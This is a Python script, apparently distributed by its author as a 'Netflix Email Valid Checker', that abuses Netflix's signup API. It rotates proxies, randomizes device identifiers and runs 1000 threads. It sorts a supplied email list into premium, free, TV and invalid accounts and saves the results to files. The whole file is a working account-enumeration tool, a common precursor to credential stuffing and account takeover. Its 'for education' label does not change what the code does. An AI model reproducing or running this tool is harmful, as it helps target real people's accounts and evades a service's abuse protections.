#### HHHHHHHHHHHH DON'T STOLE THE SOURCE CODE YOU SON OF BITCH
# Only for education ...
import requests
import time
import sys
import os
import random
import json
import string
import urllib3
import threading
from bs4 import BeautifulSoup
from urllib.parse import unquote
from multiprocessing.dummy import Pool
urllib3.disable_warnings()
os.system("title Netflix Email Valid Checker V1 By ARON-TN")
def logo():
 print('''
		\u001b[46;1m   ___   ___  ____  _  __   _______  __\u001b[0m
		\u001b[46;1m  / _ | / _ \/ __ \/ |/ /__/_  __/ |/ /\u001b[0m
		\u001b[46;1m / __ |/ , _/ /_/ /    /___// / /    / \u001b[0m 
		\u001b[46;1m/_/ |_/_/|_|\____/_/|_/    /_/ /_/|_/  \u001b[0m  
                    \u001b[31mNETFLIX EMAIL VALID CHECKER V1\u001b[0m
                    
                \u001b[41;1m[+] Facebook :\u001b[0m fb.com/amyr.gov.tn
                \u001b[44;1m[+] Facebook :\u001b[0m fb.com/aron.tn
                \u001b[46;1m[+] Telegram :\u001b[0m @aron_tn
                \u001b[47;1m[+] Github :\u001b[0m @aron-tn
                \u001b[42;1m[+] ICQ :\u001b[0m @aron_tn

 ''')
def loading():
 for i in range(0, 100):
        time.sleep(0.1)
        sys.stdout.write(u"\u001b[1000D Loading... " + str(i + 1) + "%")
        sys.stdout.flush()
def Folder(directory):
 if not os.path.exists(directory):
  os.makedirs(directory)
def netflix(email):
 while True:
  try:
   esn=''.join(random.choice(string.ascii_uppercase) for i in range(1))+''.join(random.choice(string.digits) for i in range(1))+''.join(random.choice(string.digits) for i in range(1))+''.join(random.choice(string.digits) for i in range(1))+''.join(random.choice(string.digits) for i in range(1))+''.join(random.choice(string.ascii_uppercase) for i in range(1))+''.join(random.choice(string.digits) for i in range(1))+''.join(random.choice(string.digits) for i in range(1))+''.join(random.choice(string.digits) for i in range(1))+''.join(random.choice(string.ascii_uppercase) for i in range(1))+''.join(random.choice(string.digits) for i in range(1))+''.join(random.choice(string.ascii_uppercase) for i in range(1))+''.join(random.choice(string.ascii_uppercase) for i in range(1))+''.join(random.choice(string.ascii_uppercase) for i in range(1))+''.join(random.choice(string.ascii_uppercase) for i in range(1))+''.join(random.choice(string.digits) for i in range(1))+''.join(random.choice(string.ascii_uppercase) for i in range(1))+''.join(random.choice(string.digits) for i in range(1))+''.join(random.choice(string.ascii_uppercase) for i in range(1))+''.join(random.choice(string.ascii_uppercase) for i in range(1))+''.join(random.choice(string.digits) for i in range(1))+''.join(random.choice(string.digits) for i in range(1))+''.join(random.choice(string.ascii_uppercase) for i in range(1))+''.join(random.choice(string.digits) for i in range(1))+''.join(random.choice(string.digits) for i in range(1))+''.join(random.choice(string.digits) for i in range(1))+''.join(random.choice(string.ascii_uppercase) for i in range(1))+''.join(random.choice(string.digits) for i in range(1))+''.join(random.choice(string.ascii_uppercase) for i in range(1))+''.join(random.choice(string.ascii_uppercase) for i in range(1))+''.join(random.choice(string.ascii_uppercase) for i in range(1))
   s=requests.Session()
   tt='http://%s' % (random.sample(listaprx,1)[0])
   s.proxies ={'https':tt}
   head={
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 
    'Pragma':'no-cache',
    'Accept':'*/*'
    }
   response1=s.get('https://netflix.com',headers=head).text
   soup = BeautifulSoup(response1, 'html.parser')
   pk=soup.findAll("script")
   u=0
   for i in range(16):
    if 'authURL":"' in str(pk[i]):
     u+=i
   authurl = str(pk[u]).split('authURL":"',1)[1].split('","')[0]
   authurl=authurl.replace('\\x','%')
   authurl = unquote(authurl)                                                                                     
   data=str("{\"flow\":\"signupSimplicity\",\"mode\":\"welcome\",\"authURL\":\""+str(authurl)+"\",\"action\":\"saveAction\",\"fields\":{\"phoneNumber\":\"50034045\",\"countryCode\":\"TN\"}}")
   head1={
    'content-type':'application/json',
    'Host':'www.netflix.com',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
    'Accept':'application/json, text/javascript, */*; q=0.01',
    'Accept-Language':'en-US,en;q=0.5',
    'Content-Type':'application/json',
    'X-Netflix.Client.Request.Name':'ui/xhrUnclassified', 
    'X-Requested-With':'XMLHttpRequest', 
    'Origin':'https://www.netflix.com', 
    'Connection':'keep-alive', 
    'Referer':'https://www.netflix.com/in/', 
    'Accept-Encoding':'gzip, deflate', 
   }  
   res=s.post('https://www.netflix.com/api/shakti/v2d4d7c3f/flowendpoint?flow=signupSimplicity&mode=welcome&landingURL=%2Fin%2F&landingOrigin=https%3A%2F%2Fwww.netflix.com&inapp=false&esn=NFCDFF-02-'+str(esn)+'&languages=en-IN&netflixClientPlatform=browser',headers=head1,data=data).json()
   if res['mode']=='switchFlow':
     print('\u001b[0m[+] '+str(email)+'\u001b[32m ==> PREMIUM ACCOUNT\u001b[0m')
     open('ARON-TN/PREMIUM.txt','a+').write(str(email)+'\n')
   elif res['mode']=='registrationWithContext':
     print('\u001b[0m[+] '+str(email)+'\u001b[31m ==> INVALID ACCOUNT\u001b[0m')
     open('ARON-TN/INVALID.txt','a+').write(str(email)+'\n')
   elif res['mode']=='passwordOnly':
     print('\u001b[0m[+] '+str(email)+'\u001b[32m ==> FREE ACCOUNT\u001b[0m')
     open('ARON-TN/FREE.txt','a+').write(str(email)+'\n')
   elif res['mode']=='welcome':
     print('\u001b[0m[+] '+str(email)+'\u001b[32m ==> TV ACCOUNT')
     open('ARON-TN/TV.txt','a+').write(str(email)+'\n')
   else:
     print('[+] '+str(email)+'\u001b[31m ==> UNKNOW ACCOUNT\u001b[0m')
     open('UNKNOW.txt','a+').write(str(email)+'\n')
  except Exception as exx:
   continue
  break
logo()
print("Setup Configuration ....")
loading()
print()
if os.path.isdir('ARON-TN') :
 print("\u001b[32m[+] Ohh Nice My Folder is Already Exist :p Thanks !\u001b[0m")
else:
 Folder('ARON-TN')
txt = input('\u001b[42;1m[X] emails List :\u001b[0m ')
while '.txt' not in str(txt):
 print('\u001b[31mJUST A TXT FILE PLEASE\u001b[0m ')
 txt = input('\u001b[42;1m[X] emails List :\u001b[0m ')
while not os.path.isfile(txt):
 print('\u001b[31mTHIS FILE NOT FOUND\u001b[0m ')
 txt = input('\u001b[42;1m[X] emails List :\u001b[0m ')
filep = input('\u001b[42;1m[X] Proxies List (http) :\u001b[0m ')
while '.txt' not in str(filep):
 print('\u001b[31mJUST A TXT FILE PLEASE\u001b[0m ')
 filep = input('\u001b[42;1m[X] Proxies List :\u001b[0m ')
while not os.path.isfile(filep):
 print('\u001b[31mTHIS FILE NOT FOUND\u001b[0m ')
 filep = input('\u001b[42;1m[X] Proxies List :\u001b[0m ')
os.system('cls' if os.name=='nt' else 'clear')
logo()
with open(filep) as fileprx:
 listaprx = fileprx.read().split('\n')
 random.shuffle(listaprx)
ooo = open(txt,'r')
ThreadPool = Pool(1000)
Threads = ThreadPool.map(netflix, ooo)